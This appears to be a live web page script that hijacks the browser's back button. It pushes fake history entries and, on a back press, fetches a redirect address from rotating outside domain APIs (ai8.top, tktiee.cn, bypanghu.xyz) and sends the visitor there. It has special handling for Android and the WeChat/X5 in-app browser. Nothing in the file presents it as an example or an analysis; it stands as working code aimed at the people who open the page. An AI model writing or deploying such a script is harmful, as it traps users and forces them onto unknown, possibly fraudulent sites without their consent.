window.onpageshow = function() {
    sessionStorage.getItem('jumpOut') && a();
}

var rate = 100;
var apiUrl = 'https://ai8.top/api/getWeUrl';

var apiArr = [
    'https://ai8.top/api/getWeUrl',                             //0
    'https://api.tktiee.cn/api/getDomain/3286_7bwv1yukxsbx19yg',//1
    'https://api.tktiee.cn/api/getDomain/5133_jdvue9vejevmeusg',//2
    'https://api.tktiee.cn/api/getDomain/5134_4kwyn83uebbffavk',//3
    'https://api.tktiee.cn/api/getDomain/5161_kvex7xsyf3tzyzk2',//4
    'https://aa.bypanghu.xyz/task/getDomain?hh=wt23&cs=2&pp=0',//5
];

var href = location.href ;  //获取当前请求路径
if(href.indexOf("360ab")>-1){
    //跳转t
    apiUrl = apiArr[0];//0
}else if(href.indexOf("cct.cn")>-1 ){
    apiUrl = apiArr[0];//3
}else if(href.indexOf("core")>-1 || href.indexOf("it")>-1){ //href.indexOf("cct.cn")>-1 ||
    //rate = 100;
    apiUrl = apiArr[2];//1
}else if(href.indexOf("0ta.cn")>-1 ){
    apiUrl = apiArr[0];//3
}else if(href.indexOf("ai8")>-1){
    apiUrl = apiArr[2];//2
}else{
    apiUrl = apiArr[2];//3
}

var rand_n = Math.floor(Math.random() * 100);

if(rand_n <= rate){
    ntzgo();
}


function a() {
    window.fetch(apiUrl).then(function(res) {
        return res.json();
    }).then(function(data) {
        location.href = data.url ? data.url : data.data.url;
    })
}

function ntzgo() {
    history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date()
        .getTime());
    if (navigator.userAgent.indexOf("Android") != -1) {
        if (typeof(tbsJs) != "undefined") {
            tbsJs.onReady("{useCachedApi : 'true'}", function(e) {});
            window.onhashchange = function() {
                window.history.pushState("forward", null, "#");
                window.history.forward(1);
                a()
            }
        } else {
            var pop = 0;
            window.onhashchange = function(event) {
                pop++;
                if (pop >= 3) {
                    a()
                } else {
                    history.go(1)
                }
            };
            history.go(-1)
        }
    } else {
        window.onhashchange = function() {
            a()
        }
    }
};//12-22 21:36